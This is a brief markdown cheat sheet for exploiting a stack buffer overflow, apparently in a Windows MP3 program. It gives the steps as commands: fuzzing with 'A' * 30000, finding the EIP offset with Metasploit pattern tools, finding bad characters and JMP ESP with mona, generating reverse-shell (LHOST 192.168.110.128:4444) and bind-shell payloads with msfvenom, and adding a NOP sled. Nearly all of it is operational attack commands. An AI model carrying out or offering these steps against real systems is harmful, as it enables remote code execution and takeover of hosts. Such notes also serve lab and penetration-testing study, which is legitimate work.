# Buffer Overflow

## 1 - Find the access violation

```
A * 30000
```
> Access Violation 41414141

## 2 - Find EIP using pattern (-q EIP address)

```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 30000 > ~/Desktop/mp3_bufferoverflow_pattern.txt
```
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 48386B48 -l 30000
```

## 3 - Find bad char

```
!mona bytearray -cpb '\x00\x09\x0a’
```
```
!mona compare -f C:\logs\<app>\bytearray.bin -a 000FF730
```

## 4 - Find JMP ESP
- Address cannot have bad char
- Consider MSVCP60.dll and kernetl32.dll

```
!mona jump -r ESP
```

## 5 - Create shell code without bad char

reverse shell
```
msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.110.128 LPORT=4444 -b '\x00\x09\x0a' -f python -v shell
```
bind shell
```
msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -e x86/alpha_mixed -b '\x00' BufferRegister=ESP -f python -v shell
```

## 6 - Place shell later after ESP

```
buffer += b'\x90' * 10
```